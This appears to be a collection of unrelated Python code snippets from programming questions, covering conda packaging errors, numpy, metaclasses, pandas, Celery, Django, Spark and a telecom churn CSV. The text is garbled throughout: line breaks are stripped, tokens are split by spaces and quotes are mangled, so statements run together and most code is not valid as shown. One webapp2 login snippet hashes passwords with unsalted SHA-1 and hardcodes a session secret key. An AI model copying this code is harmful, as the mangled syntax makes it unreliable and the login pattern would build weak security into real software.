"C : \WINDOWS\system32 > conda skeleton pypi pyinstrumentWarning , the following versions were found for pyinstrument0.10.10.110.120.130.13.1Using 0.13.1Use -- version to specify a different version.Using url https : //pypi.python.org/packages/64/56/d7a0d48973dcf58ea74d5f004e16e9496Downloading pyinstrumentUsing cached downloadUnpacking pyinstrument ... doneworking in C : \Users\Peter\AppData\Local\Temp\tmpi40k4yslconda_skeleton_pyinstrumenThe following NEW packages will be INSTALLED : pip : 8.1.2-py35_0 python : 3.5.2-0 pyyaml : 3.12-py35_0 setuptools : 27.2.0-py35_1 vs2015_runtime : 14.0.25123-0 wheel : 0.29.0-py35_0Applying patch : ' C : \\Users\\Peter\\AppData\\Local\\Temp\\tmpi40k4yslconda_skeleton Error : Can not use 'git ' ( not a git repo and/or patch ) and did notfind 'patch ' in : C : \Users\Peter\Anaconda3\conda-bld\skeleton_1478133848196\_b_env\Scripts ; ... .. ... You can install 'patch ' using apt-get , yum ( Linux ) , Xcode ( MacOSX ) , or conda , m2-patch ( Windows ) ,"
"a = array ( [ 1,2,3,4,7,8,9,10,17 ] ) b = array ( [ 5,6,13,14,15,19,21,23 ] )"
"new_data = npy.array ( [ new_x , new_y1 , new_y2 , new_y3 ] ) private.data = npy.row_stack ( [ private.data , new_data ] )"
class A ( list ) : def __init__ ( self ) : list.__init__ ( self ) import typingclass A ( list : typing.List [ str ] ) : # Maybe something like this def __init__ ( self ) : list.__init__ ( self ) > > a = A ( ) > > a.append ( `` a '' ) # No typing error > > a.append ( 1 ) # Typing error
"class BaseTest ( T.TestCase ) : # Disables this test from being run __test__ = False def test_foo ( self ) : pass # However this test is picked up because it does n't directly have __test__ setclass InheritingTest ( BaseTest ) : pass # > > InheritingTest.__test__ # False def is_class_tested ( cls ) : return cls.__dict__.get ( '__test__ ' , True )"
"import itertoolsdef primes ( ) : candidates = itertools.count ( 2 ) while True : prime = next ( candidates ) candidates = ( i for i in candidates if i % prime ) yield prime print ( list ( itertools.islice ( primes ( ) ,0,10 ) ) ) [ 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 , 11 ] def primes ( ) : candidates = itertools.count ( 2 ) while True : prime = next ( candidates ) candidates = ( i for i in candidates if i % prime ) next ( itertools.tee ( candidates ) [ 1 ] ) # # # # # # # # # # # NEW LINE yield prime candidates = ( i for i in candidates if i % prime )"
"> > > a = [ ' a ' , ' b ' , ' c ' , 'd ' ] > > > list ( lookahead ( a ) ) [ ( ' a ' , ' b ' ) , ( ' b ' , ' c ' ) , ( ' c ' , 'd ' ) , ( 'd ' , None ) ] for ( token , lookahead_1 ) in lookahead ( a ) : pass"
"class Meta ( type ) : def __instancecheck__ ( self , instance ) : print ( `` __instancecheck__ '' ) return Trueclass A ( metaclass=Meta ) : passa = A ( ) isinstance ( a , A ) # __instancecheck__ not calledisinstance ( [ ] , A ) # __instancecheck__ called"
"from abc import ABCMeta , abstractmethodclass Abstract ( object ) : __metaclass__ = ABCMeta @ abstractmethod def foo ( self ) : print ( `` tst '' ) a = Abstract ( ) a.foo ( ) pydev debugger : starting ( pid : 20388 ) tst > > > TypeError : Can not instantiate abstract class Abstract with abstract methods foo"
"def powerOfSum1 ( ) : listOfN = [ ] arange = [ a for a in range ( 11 , 1000000 ) ] # range of potential Ns prange = [ a for a in range ( 2 , 6 ) ] # a range for the powers to calculate for num in arange : sumOfDigits = sum ( map ( int , str ( num ) ) ) powersOfSum = [ sumOfDigits**p for p in prange ] if num in powersOfSum : listOfN.append ( num ) return listOfN def powerOfSum2 ( ) : listOfN = [ ] powers= { } for num in range ( 11 , 1000000 ) : sumOfDigits = sum ( map ( int , str ( num ) ) ) summ = str ( sumOfDigits ) if summ in powers : if num in powers [ summ ] : listOfN.append ( num ) else : powersOfSum = [ sumOfDigits**p for p in range ( 2,6 ) ] powers [ summ ] = powersOfSum if num in powers [ summ ] : listOfN.append ( num ) return listOfN"
"buf = io.StringIO ( ) cursor = conn.cursor ( ) sql_query = 'COPY ( '+ base_sql + ' limit 100 ) TO STDOUT WITH CSV HEADER ' cursor.copy_expert ( sql_query , buf ) df = pd.read_csv ( buf.getvalue ( ) , engine= ' c ' ) buf.close ( ) pandas\parser.pyx in pandas.parser.TextReader.__cinit__ ( pandas\parser.c:4175 ) ( ) pandas\parser.pyx in pandas.parser.TextReader._setup_parser_source ( pandas\parser.c:8333 ) ( ) C : \Users\ ... .\AppData\Local\Continuum\Anaconda3\lib\genericpath.py in exists ( path ) 17 `` '' '' Test whether a path exists . Returns False for broken symbolic links '' '' '' 18 try : -- - > 19 os.stat ( path ) 20 except OSError : 21 return FalseValueError : stat : path too long for Windows # COPY TO CSV quick and dirty performance testimport ioimport sysstart = time.time ( ) conn_str_copy= r'postgresql+psycopg2 : // ' + user_id + r '' : '' + pswd + r '' @ xxx.xxx.xxx.xxx : ppppp/my_database '' result = urlparse ( conn_str_copy ) username = result.usernamepassword = result.passworddatabase = result.path [ 1 : ] hostname = result.hostnamesize = 2**30buf = io.BytesIO ( ) # buf = io.StringIO ( ) engine = create_engine ( conn_str_copy ) conn_copy= psycopg2.connect ( database=database , user=username , password=password , host=hostname ) cursor_copy = conn_copy.cursor ( ) sql_query = 'COPY ( '+ my_sql_query + ' ) TO STDOUT WITH CSV HEADER'cursor_copy.copy_expert ( sql_query , buf , size ) print ( 'time : ' , ( time.time ( ) - start ) /60 , 'minutes or ' , time.time ( ) - start , 'seconds ' ) tmp = buf.seek ( 0 ) df = pd.read_csv ( buf , engine= ' c ' , low_memory=False ) buf.close ( ) print ( 'time : ' , ( time.time ( ) - start ) /60 , 'minutes or ' , time.time ( ) - start , 'seconds ' )"
"import numpy as npfrom sklearn.gaussian_process import GaussianProcessRegressorfrom sklearn.gaussian_process.kernels import Matern as M , RBF as RX = np.matrix ( [ [ 1.,2 ] , [ 3.,4 ] , [ 5.,1 ] , [ 6.,5 ] , [ 4 , 7 . ] , [ 9,8 . ] , [ 1.,2 ] , [ 3.,4 ] , [ 5.,1 ] , [ 6.,5 ] , [ 4 , 7 . ] , [ 9,8 . ] , [ 1.,2 ] , [ 3.,4 ] , [ 5.,1 ] , [ 6.,5 ] , [ 4 , 7 . ] , [ 9,8 . ] ] ) .Ty= [ 0.84147098 , 0.42336002 , -4.79462137 , -1.67649299 , 4.59890619 , 7.91486597 , 0.84147098 , 0.42336002 , -4.79462137 , -1.67649299 , 4.59890619 , 7.91486597 , 0.84147098 , 0.42336002 , -4.79462137 , -1.67649299 , 4.59890619 , 7.91486597 ] kernel = R ( X [ 0 ] ) * M ( X [ 1 ] ) gp = GaussianProcessRegressor ( kernel=kernel ) gp.fit ( X , y )"
"def foo ( bar : int = None ) : pass In [ 1 ] : from typing import OptionalIn [ 2 ] : from inspect import signatureIn [ 3 ] : def foo ( a : int = None ) : passIn [ 4 ] : def bar ( a : Optional [ int ] = None ) : passIn [ 5 ] : signature ( foo ) .parameters [ ' a ' ] .annotationOut [ 5 ] : intIn [ 6 ] : signature ( bar ) .parameters [ ' a ' ] .annotationOut [ 6 ] : typing.Union [ int , NoneType ]"
"engine = create_engine ( 'sqlite : /// : memory : ' ) Base.metadata.create_all ( engine ) import alembic.configalembicArgs = [ ' -- raiseerr ' , '-x ' , 'dbPath=sqlite : /// : memory : ' , 'upgrade ' , 'head ' ] alembic.config.main ( argv=alembicArgs def run_migrations_online ( ) : ini_section = config.get_section ( config.config_ini_section ) db_path = context.get_x_argument ( as_dictionary=True ) .get ( 'dbPath ' ) if db_path : ini_section [ 'sqlalchemy.url ' ] = db_path connectable = engine_from_config ( ini_section , prefix ... # everything from here the same as default env.py"
"class Base ( object ) : def __init__ ( self ) : for attr in self._myattrs : setattr ( self , attr , property ( lambda self : self._lazy_eval ( attr ) ) ) def _lazy_eval ( self , attr ) : # Do complex stuff here return attrclass Child ( Base ) : _myattrs = [ 'foo ' , 'bar ' ] me = Child ( ) print me.fooprint me.bar # desired output : # '' foo '' # '' bar '' class Base ( object ) : def __new__ ( cls ) : for attr in cls._myattrs : setattr ( cls , attr , property ( lambda self : self._lazy_eval ( attr ) ) ) return object.__new__ ( cls ) # Actual output ( it sets both .foo and .bar equal to `` bar '' ? ? ) # bar # bar class Base ( object ) : def __new__ ( cls ) : def prop ( x ) : return property ( lambda self : self._lazy_eval ( x ) ) for attr in cls._myattrs : setattr ( cls , attr , prop ( attr ) ) return object.__new__ ( cls ) # Actual output ! It works ! # foo # bar"
y_1 = x_1y_2 = x_2 - 1y_3 = x_3 - 2 ... y_r = x_r - ( r-1 )
"> > > json.loads ( json.dumps ( [ u '' x '' , `` x '' ] ) ) [ u ' x ' , u ' x ' ] # Both unicode > > > msgpack.loads ( msgpack.dumps ( [ u '' x '' , `` x '' ] ) ) [ ' x ' , ' x ' ] # Neither are unicode > > > bson.loads ( bson.dumps ( { `` x '' : [ u '' x '' , `` x '' ] } ) ) { u ' x ' : [ u ' x ' , ' x ' ] } # Dict keys become unicode > > > pyamf.decode ( pyamf.encode ( [ u '' x '' , `` x '' ] ) ) .next ( ) [ u ' x ' , u ' x ' ] # Both are unicode"
"class Planet ( Enum ) : MERCURY = ( mass : 3.303e+23 , radius : 2.4397e6 ) def __init__ ( self , mass , radius ) : self.mass = mass # in kilograms self.radius = radius # in meters"
"class Foo ( System.Collections.Generic.List [ str ] ) : def Test ( self ) : print `` test ! '' SystemError : Type 'IronPython.NewTypes.System.Collections.Generic.List ` 1_4 $ 4 ' in Assembly Snippets.scripting , Version=0.0.0.0 , Culture=neutral , PublicKeyToken=null ' is not marked as serializable ."
( \bthe\b|\bcat\b|\bin\b|\bhat\.\b|\bhat\b ) hat .
a.f90a.pyflib.a < - this is a static library that contains most of the computational code f2py -- build-dir temp -c a.pyf a.f90 lib.a -- fcompiler=gnu95 -- fcompiler-flags= '' Zillions of compiler options ''
"df2 = pd.DataFrame ( { 'date ' : [ '2015-01-01 ' , '2015-01-02 ' , '2015-01-03 ' ] , 'value ' : [ ' a ' , ' b ' , ' a ' ] } ) date value0 2015-01-01 a1 2015-01-02 b2 2015-01-03 a df2.rolling ( 2 ) .apply ( lambda x : 1 ) date value0 2015-01-01 a1 2015-01-02 b2 2015-01-03 a df3 = pd.DataFrame ( { ' a ' : [ 1 , 2 , 3 ] , 'value ' : [ 4 , 5 , 6 ] } ) df3.rolling ( 2 ) .apply ( lambda x : 1 ) a value0 NaN NaN1 1.0 1.02 1.0 1.0 df2.rolling ( 2 ) .apply ( lambda x : ' a ' ) date value0 2015-01-01 a1 2015-01-02 b2 2015-01-03 a df2.rolling ( 2 ) .apply ( lambda x : ' . '.join ( x ) ) date value0 2015-01-01 a1 2015-01-02 b2 2015-01-03 a"
"import Image , ImageDrawfrom scipy import miscimport mathWHITE = ( 255,255,255 ) BLACK = ( 0,0,0 ) W , H = 435 , 353im = Image.new ( 'RGBA ' , ( W , H ) , BLACK ) draw = ImageDraw.Draw ( im ) bitmap = misc.imread ( 'Image.png ' ) def affine_t ( x , y , a , b , c , d , e , f ) : `` '' '' Returns ( ( a , b ) , ( c , d ) ) * ( ( x ) , ( y ) ) + ( ( e ) , ( f ) ) . '' '' '' return a*x + b*y + e , c*x + d*y + fdef crotate ( x , y , r ) : `` '' '' Rotate ( x , y ) clockwise by r radians . '' '' '' # And move 300 px to the right for this example return affine_t ( x , y , math.cos ( -r ) , math.sin ( -r ) , -math.sin ( -r ) , math.cos ( -r ) , 300 , 0 ) x , y = 0 , 0angle = math.pi/4for row in bitmap : for pt in row : draw.point ( [ crotate ( x , y , angle ) , ] , fill=tuple ( pt ) ) x+= 1 x = 0 y += 1im.save ( 'out.png ' )"
"import matplotlib.pyplot as pltfrom matplotlib.patches import Patchfrom pylab import *t = arange ( 0.0 , 2.0 , 0.01 ) s = sin ( 2*pi*t ) fig1 = plt.figure ( 1 , ( 10,10 ) ) plt.plot ( t , s ) plt.xlabel ( 'time ( s ) ' ) plt.ylabel ( 'voltage ( mV ) ' ) plt.title ( 'About as simple as it gets , folks ' ) plt.grid ( True ) far_patch = Patch ( color= [ 168/256,175/256,175/256 ] , label='Farshore ' ) near_patch = Patch ( color= [ 168/256,175/256,175/256 ] , label='Nearshore ' , hatch = ' o ' ) legend=plt.legend ( handles= [ far_patch , near_patch ] , loc='upper left ' , handlelength=1 , handleheight=1 , labelspacing=0 , fontsize=8 , borderaxespad=0.3 , handletextpad=0.2 ) frame = legend.get_frame ( ) frame.set_edgecolor ( 'none ' ) figureName='test'plt.savefig ( figureName+'.pdf ' , bbox_inches='tight ' , dpi=fig1.dpi ) plt.show ( )"
"class SpecialRule : `` '' '' '' '' '' name= '' Special Rule '' description= '' This is a Special Rule . '' def __init__ ( self , name=None ) : `` '' '' '' '' '' print `` SpecialInit '' if name ! =None : SPECIAL_RULES= { `` Fly '' : FlyRule ( ) , `` Skirmish '' : SkirmishRule ( ) } # dictionary coupling names to SpecialRuleclasses self.__class__= SPECIAL_RULES [ name ] .__class__ def __str__ ( self ) : `` '' '' '' '' '' return self.nameclass FlyRule ( SpecialRule ) : `` '' '' '' '' '' name= '' Fly '' description= '' Flies . '' def __init__ ( self ) : `` '' '' '' '' '' print `` FlyInit '' +self.name SpecialRule.__init__ ( self ) def addtocontainer ( self , container ) : `` '' '' this instance messes with the attributes of its containing class when added to some sort of list '' '' '' class SkirmishRule ( SpecialRule ) : `` '' '' '' '' '' name= '' Skirmish '' description= '' Skirmishes . '' def __init__ ( self ) : `` '' '' '' '' '' SpecialRule.__init__ ( self ) def addtocontainer ( self , container ) : `` '' '' this instance messes with the attributes of its containing class when added to some sort of list '' '' '' test=SpecialRule ( `` Fly '' ) print `` evaluating resulting class '' print test.descriptionprint test.__class__ < /pre > < /code > > SpecialInit FlyInitFly SpecialInit evaluating resulting class Flies . main.FlyRule >"
"location=new firebase.firestore.GeoPoint ( latitude , longitude )"
"updated = Account.objects.filter ( id=self.id , version=self.version , ) .update ( balance=balance + amount , version=self.version + 1 , )"
minradius=0maxradius=0dp=1param1=100param2=21
"my_jumble = [ 'jumbly ' , 'wumbly ' , 'number ' , 5 ] print ( my_jumble [ :1 : -1 ] ) [ 5 , 'number ' ] print ( my_jumble [ :2 : -1 ] ) [ 5 , 'number ' , 'wumbly ' ] [ 5 ]"
"import webapp2from webapp2_extras import sessionsclass BaseHandler ( webapp2.RequestHandler ) : def render_template ( self , view_filename , params=None ) : params = { } path = os.path.join ( os.path.dirname ( __file__ ) , 'views ' , view_filename ) self.response.out.write ( template.render ( path , params ) ) def display_message ( self , message ) : `` '' '' Utility function to display a template with a simple message . '' '' '' params = { } self.render_template ( 'message.html ' , params ) def dispatch ( self ) : # Get a session store for this request . self.session_store = sessions.get_store ( request=self.request ) try : # Dispatch the request . webapp2.RequestHandler.dispatch ( self ) finally : # Save all sessions . self.session_store.save_sessions ( self.response ) @ webapp2.cached_property def session ( self ) : # Returns a session using the default cookie key . return self.session_store.get_session ( ) from google.appengine.ext import ndbimport webapp2from webapp2_extras.security import hash_passwordimport loggingimport osimport sysimport jinja2from src.basehandler import BaseHandlerfrom src.user import UserJINJA_ENVIRONMENT = jinja2.Environment ( loader=jinja2.FileSystemLoader ( os.path.dirname ( __file__ ) ) , extensions= [ 'jinja2.ext.autoescape ' ] ) class MainPage ( BaseHandler ) : def get ( self ) : template_values = { } template = JINJA_ENVIRONMENT.get_template ( 'templates/index.html ' ) self.response.write ( template.render ( template_values ) ) def post ( self ) : email_address = self.request.get ( 'input-email ' ) password = self.request.get ( 'input-password ' ) password = hash_password ( password , 'sha1 ' , salt=None , pepper=None ) qry = User.query ( ndb.AND ( User.email_address == email_address , User.password == password ) ) .fetch ( ) if qry : self.session [ 'loggedin ' ] = True self.redirect ( 'http : //dashboard.myURL.appspot.com/ ' ) else : self.redirect ( '/ ? error=invaliduser ' ) config = { } config [ 'webapp2_extras.sessions ' ] = { 'secret_key ' : 'my-super-secret-key ' , } app = webapp2.WSGIApplication ( [ ( '/ ' , MainPage ) ] , debug=True , config=config ) from google.appengine.ext import ndbimport webapp2import loggingimport osimport sysimport jinja2from src.basehandler import BaseHandlerfrom src.user import UserJINJA_ENVIRONMENT = jinja2.Environment ( loader=jinja2.FileSystemLoader ( os.path.dirname ( __file__ ) ) , extensions= [ 'jinja2.ext.autoescape ' ] ) class Main ( BaseHandler ) : def get ( self ) : msg = `` if not self.session.get ( 'loggedin ' ) : msg = 'There is not session ' else : msg = 'There is a session ' template_values = { 'msg ' : msg } template = JINJA_ENVIRONMENT.get_template ( 'templates/index.html ' ) self.response.write ( template.render ( template_values ) ) config = { } config [ 'webapp2_extras.sessions ' ] = { 'secret_key ' : 'my-super-secret-key ' , } app = webapp2.WSGIApplication ( [ ( '/ ' , Main ) ] , debug=True , config=config )"
"import findsparkfindspark.init ( ) import pysparksc = pyspark.SparkContext ( appName='myApp ' ) a = sc.range ( 1000 , numSlices=10 ) a.take ( 10 ) sc.stop ( ) import pysparkfrom myPackage import myFuncsc = pyspark.SparkContext ( appName='myApp ' ) a = sc.range ( 1000 , numSlices=10 ) b = a.map ( lambda x : myFunc ( x ) ) b.take ( 10 ) sc.stop ( ) spark-submit -- master yarn -- py-files myPackageSrcFiles.zip main.py"
put_async ( MyLogData ( text= '' My Text '' ) )
"def __init__ ( self , canvas , segments ) : `` '' '' Class constructor . : param canvas : the PDF canvas object : param segment : The layer segments to be drawn . : type canvas : ` canvas.Canvas ` : type segments : list of str `` '' '' ... class Path ( object ) : `` '' '' : ivar edge_indices : The indices within ` textured_points ` of the places . : type edge_indices : list of int `` '' ''"
"class UserSerializer ( ModelSerializer ) : class Meta : model = User fields = [ 'id ' , 'email ' , 'first_name ' , 'last_name ' ] ... . class UserViewSet ( ModelViewSet ) : queryset = User.objects.all ( ) serializer_class = UserSerializer"
"celery_test celery_tasks __init__.py celery_app.py async __init__.py tasks.py marker __init__.py tasks.py celery_app.pyfrom __future__ import absolute_importfrom celery import Celerycelery_application = Celery ( 'celery_test ' , backend='redis : //localhost ' , broker='redis : //localhost ' ) @ celery_application.taskdef test_celery ( ) : print 4 async/tasks.pyfrom __future__ import absolute_importimport timefrom celery_tasks.celery_app import celery_application @ celery_application.taskdef async_test ( ) : print 'Start async_test ' time.sleep ( 3 ) print 'Finish async_test ' celery -- app=celery_tasks.celery_app : celery_application worker -l debug -- -- -- -- -- -- -- celery @ LAPTOP-HCR4G00Q v3.1.25 ( Cipater ) -- -- **** -- -- -- -- * *** * -- Windows-10-10.0.16299 -- * - **** -- -- ** -- -- -- -- -- [ config ] - ** -- -- -- -- -- . > app : celery_test:0x6ff3f28- ** -- -- -- -- -- . > transport : redis : //localhost:6379//- ** -- -- -- -- -- . > results : redis : //localhost/- *** -- - * -- - . > concurrency : 4 ( prefork ) -- ******* -- -- -- - ***** -- -- - [ queues ] -- -- -- -- -- -- -- . > celery exchange=celery ( direct ) key=celery [ tasks ] . celery.backend_cleanup . celery.chain . celery.chord . celery.chord_unlock . celery.chunks . celery.group . celery.map . celery.starmap . celery_tasks.celery_app.test_celery"
y = [ xi for xi in x.flat ]
"url ( r'^evaluation-active/ $ ' , 'web.evaluation.evaluation ' , name='evaluation ' ) , def is_evaluation ( request ) : return { `` test '' : request.get_full_path ( ) }"
public class Antipattern1 { public static void main ( String [ ] args ) { try { int i = 0 ; while ( true ) { System.out.println ( args [ i++ ] ) ; } } catch ( ArrayIndexOutOfBoundsException e ) { // we are done } } }
"def foo ( x ) : with tf.GradientTape ( ) as tape : tape.watch ( x ) y = x**2 + x + 4 return tape.gradient ( y , x )"
"class A ( object ) : def random_function ( self ) : print self.name def abstract_function ( self ) : raise NotImplementedError ( `` This is an abstract class '' ) class B ( A ) : def __init__ ( self ) : self.name = `` Bob '' super ( B , self ) .__init__ ( ) def abstract_function ( self ) : print `` This is not an abstract class ''"
def my_count ( ) : while True : print `` Number of Things : % d '' % Thing.objects.count ( ) time.sleep ( 5 ) my_count ( )
"pdf = StringIO ( ) draw_pdf ( pdf , params ) pdf.seek ( 0 ) attachment = MIMEApplication ( pdf.read ( ) ) attachment.add_header ( `` Content-Disposition '' , `` attachment '' , filename=filename ) pdf.close ( ) from django.core.mail import EmailMultiAlternativesmsg = EmailMultiAlternatives ( subject , text_content , from_email , to_email ) if html_content : msg.attach_alternative ( html_content , `` text/html '' ) if attachment : msg.attach ( attachment ) msg.send ( ) requests.post ( mailgun_url , auth= ( `` api '' , mailgun_api ) , data=data , files=attachment ) filename = `` pdf_attachment.pdf '' pdf = StringIO ( ) draw_pdf ( pdf , params ) pdf.seek ( 0 ) attachment = ( `` attachment '' , ( filename , pdf.read ( ) ) ) r = requests.post ( mailgun_url , auth= ( `` api '' , mailgun_api ) , data=data , files= [ attachment ] )"
"In [ 1 ] : df [ column ] [ rows ] .max ( ) Out [ 1 ] : 0 2 days , 02:08:07dtype : timedelta64 [ ns ] In [ 2 ] : df [ column ] [ rows ] .max ( ) [ 0 ] Out [ 2 ] : numpy.timedelta64 ( 180487000000000 , 'ns ' ) In [ 2 ] : str ( df [ column ] [ rows ] .max ( ) [ 0 ] ) Out [ 2 ] : '180487000000000 nanoseconds '"
"class TimeUserMixin ( object ) : create_time = Column ( DateTime , default=datetime.datetime.now , nullable=False ) modify_time = Column ( DateTime , default=datetime.datetime.now , onupdate=datetime.datetime.now , nullable=False ) @ declared_attr def create_user_id ( cls ) : return Column ( Integer , ForeignKey ( 'tg_user.user_id ' ) , default=cls.get_user_id , nullable=False ) @ declared_attr def modify_user_id ( cls ) : return Column ( Integer , ForeignKey ( 'tg_user.user_id ' ) , default=cls.get_user_id , onupdate=cls.get_user_id , nullable=False ) @ declared_attr def create_user ( cls ) : return relation ( 'User ' , primaryjoin= ' % s.create_user_id == User.user_id ' % cls.__name__ ) @ declared_attr def modify_user ( cls ) : return relation ( 'User ' , primaryjoin= ' % s.modify_user_id == User.user_id ' % cls.__name__ ) @ classmethod def get_user_id ( cls ) : # will eventually return user id if logged in or a generic system user . return 1Error ( DETAIL : Key ( create_user_id ) = ( 1 ) is not present in table `` tg_user '' . )"
", user_account_id , user_lifetime , user_no_outgoing_activity_in_days , user_account_balance_last , user_spendings , reloads_inactive_days , reloads_count , reloads_sum , calls_outgoing_count , calls_outgoing_spendings , calls_outgoing_duration , calls_outgoing_spendings_max , calls_outgoing_duration_max , calls_outgoing_inactive_days , calls_outgoing_to_onnet_count , calls_outgoing_to_onnet_spendings , calls_outgoing_to_onnet_duration , calls_outgoing_to_onnet_inactive_days , calls_outgoing_to_offnet_count , calls_outgoing_to_offnet_spendings , calls_outgoing_to_offnet_duration , calls_outgoing_to_offnet_inactive_days , calls_outgoing_to_abroad_count , calls_outgoing_to_abroad_spendings , calls_outgoing_to_abroad_duration , calls_outgoing_to_abroad_inactive_days , sms_outgoing_count , sms_outgoing_spendings , sms_outgoing_spendings_max , sms_outgoing_inactive_days , sms_outgoing_to_onnet_count , sms_outgoing_to_onnet_spendings , sms_outgoing_to_onnet_inactive_days , sms_outgoing_to_offnet_count , sms_outgoing_to_offnet_spendings , sms_outgoing_to_offnet_inactive_days , sms_outgoing_to_abroad_count , sms_outgoing_to_abroad_spendings , sms_outgoing_to_abroad_inactive_days , sms_incoming_count , sms_incoming_spendings , sms_incoming_from_abroad_count , sms_incoming_from_abroad_spendings , gprs_session_count , gprs_usage , gprs_spendings , gprs_inactive_days , last_100_reloads_count , last_100_reloads_sum , last_100_calls_outgoing_duration , last_100_calls_outgoing_to_onnet_duration , last_100_calls_outgoing_to_offnet_duration , last_100_calls_outgoing_to_abroad_duration , last_100_sms_outgoing_count , last_100_sms_outgoing_to_onnet_count , last_100_sms_outgoing_to_offnet_count , last_100_sms_outgoing_to_abroad_count , last_100_gprs_usage , user_intake , user_has_outgoing_calls , user_has_outgoing_sms , user_use_gprs , user_does_reload , n_months , month , churn0,1031,947.0,0.3333333333333333,10.993333333333334,10.3,12.0,1.3333333333333333,10.013333333333334,83.66666666666667,5.859999999999999,55.69,0.5966666666666667,10.333333333333334,0.6666666666666666,0.0,0.0,0.0,0.6666666666666666,23.333333333333332,2.8833333333333333,25.0,0.6666666666666666,0.0,0.0,0.0,0.6666666666666666,135.33333333333334,4.44,0.06,0.3333333333333333,16.333333333333332,0.98,0.3333333333333333,57.666666666666664,3.4599999999999995,0.3333333333333333,0.0,0.0,0.3333333333333333,14.0,0.0,0.0,0.0,0.0,0.0,0.0,1307.0,5.666666666666667,22.01666666666667,130.48,0.0,65.33333333333333,0.0,287.3333333333333,34.0,113.66666666666667,0.0,0.0,0,1,1,0,1,3,9,01,4231,951.0,1.3333333333333333,27.546666666666667,6.45,22.0,1.0,12.013333333333334,46.333333333333336,6.45,47.150000000000006,1.3233333333333333,8.81,1.3333333333333333,0.0,0.0,0.0,1.3333333333333333,31.666666666666668,6.400000000000001,42.656666666666666,1.3333333333333333,0.0,0.0,0.0,1.3333333333333333,0.6666666666666666,0.0,0.0,57.0,0.0,0.0,57.0,0.0,0.0,57.0,0.0,0.0,57.0,10.666666666666666,0.0,0.0,0.0,0.0,0.0,0.0,1307.0,4.0,32.026666666666664,156.96666666666667,0.0,145.42999999999998,0.0,1.6666666666666667,0.0,0.3333333333333333,0.0,0.0,0,1,1,0,1,3,9,02,5231,523.0,0.6666666666666666,14.62,1.0999999999999999,1307.0,0.0,0.0,14.333333333333334,1.0999999999999999,7.573333333333333,0.7266666666666666,4.84,0.6666666666666666,0.0,0.0,0.0,0.6666666666666666,8.333333333333334,0.3233333333333333,2.1566666666666667,0.6666666666666666,0.0,0.0,0.0,0.6666666666666666,0.0,0.0,0.0,1307.0,0.0,0.0,1307.0,0.0,0.0,1307.0,0.0,0.0,1307.0,8.333333333333334,0.0,0.0,0.0,0.0,0.0,0.0,1307.0,0.0,0.0,47.330000000000005,0.0,10.356666666666667,0.0,0.0,0.0,0.0,0.0,0.0,0,1,0,0,0,3,9,0 ca1DF = ( sqlContext.read.load ( `` merged.csv '' , format= '' com.databricks.spark.csv '' , header=True , inferSchema=True ) .rdd.toDF ( [ `` user_account_id '' , `` user_lifetime '' , `` user_no_outgoing_activity_in_days '' , `` user_account_balance_last '' , `` user_spendings '' , `` reloads_inactive_days '' , `` reloads_count '' , `` reloads_sum '' , `` calls_outgoing_count '' , `` calls_outgoing_spendings '' , `` calls_outgoing_duration '' , `` calls_outgoing_spendings_max '' , `` calls_outgoing_duration_max '' , `` calls_outgoing_inactive_days '' , `` calls_outgoing_to_onnet_count '' , `` calls_outgoing_to_onnet_spendings '' , `` calls_outgoing_to_onnet_duration '' , `` calls_outgoing_to_onnet_inactive_days '' , `` calls_outgoing_to_offnet_count '' , `` calls_outgoing_to_offnet_spendings '' , `` calls_outgoing_to_offnet_duration '' , `` calls_outgoing_to_offnet_inactive_days '' , `` calls_outgoing_to_abroad_count '' , `` calls_outgoing_to_abroad_spendings '' , `` calls_outgoing_to_abroad_duration '' , `` calls_outgoing_to_abroad_inactive_days '' , `` sms_outgoing_count '' , `` sms_outgoing_spendings '' , `` sms_outgoing_spendings_max '' , `` sms_outgoing_inactive_days '' , `` sms_outgoing_to_onnet_count '' , `` sms_outgoing_to_onnet_spendings '' , `` sms_outgoing_to_onnet_inactive_days '' , `` sms_outgoing_to_offnet_count '' , `` sms_outgoing_to_offnet_spendings '' , `` sms_outgoing_to_offnet_inactive_days '' , `` sms_outgoing_to_abroad_count '' , `` sms_outgoing_to_abroad_spendings '' , `` sms_outgoing_to_abroad_inactive_days '' , `` sms_incoming_count '' , `` sms_incoming_spendings '' , `` sms_incoming_from_abroad_count '' , `` sms_incoming_from_abroad_spendings '' , `` gprs_session_count '' , `` gprs_usage '' , `` gprs_spendings '' , `` gprs_inactive_days '' , `` last_100_reloads_count '' , `` last_100_reloads_sum '' , `` last_100_calls_outgoing_duration '' , `` last_100_calls_outgoing_to_onnet_duration '' , `` last_100_calls_outgoing_to_offnet_duration '' , `` last_100_calls_outgoing_to_abroad_duration '' , `` last_100_sms_outgoing_count '' , `` last_100_sms_outgoing_to_onnet_count '' , `` last_100_sms_outgoing_to_offnet_count '' , `` last_100_sms_outgoing_to_abroad_count '' , `` last_100_gprs_usage '' , `` user_intake '' , `` user_has_outgoing_calls '' , `` user_has_outgoing_sms '' , `` user_use_gprs '' , `` user_does_reload '' , `` n_months '' , `` churn '' ] ) ) .cache ( ) ca1DF.show ( 5 ) |user_account_id|user_lifetime|user_no_outgoing_activity_in_days|user_account_balance_last| user_spendings|reloads_inactive_days| reloads_count| reloads_sum|calls_outgoing_count|calls_outgoing_spendings|calls_outgoing_duration|calls_outgoing_spendings_max|calls_outgoing_duration_max|calls_outgoing_inactive_days|calls_outgoing_to_onnet_count|calls_outgoing_to_onnet_spendings|calls_outgoing_to_onnet_duration|calls_outgoing_to_onnet_inactive_days|calls_outgoing_to_offnet_count|calls_outgoing_to_offnet_spendings|calls_outgoing_to_offnet_duration|calls_outgoing_to_offnet_inactive_days|calls_outgoing_to_abroad_count|calls_outgoing_to_abroad_spendings|calls_outgoing_to_abroad_duration|calls_outgoing_to_abroad_inactive_days|sms_outgoing_count|sms_outgoing_spendings|sms_outgoing_spendings_max|sms_outgoing_inactive_days|sms_outgoing_to_onnet_count|sms_outgoing_to_onnet_spendings|sms_outgoing_to_onnet_inactive_days|sms_outgoing_to_offnet_count|sms_outgoing_to_offnet_spendings|sms_outgoing_to_offnet_inactive_days|sms_outgoing_to_abroad_count|sms_outgoing_to_abroad_spendings|sms_outgoing_to_abroad_inactive_days|sms_incoming_count|sms_incoming_spendings|sms_incoming_from_abroad_count|sms_incoming_from_abroad_spendings|gprs_session_count|gprs_usage|gprs_spendings|gprs_inactive_days|last_100_reloads_count|last_100_reloads_sum|last_100_calls_outgoing_duration|last_100_calls_outgoing_to_onnet_duration|last_100_calls_outgoing_to_offnet_duration|last_100_calls_outgoing_to_abroad_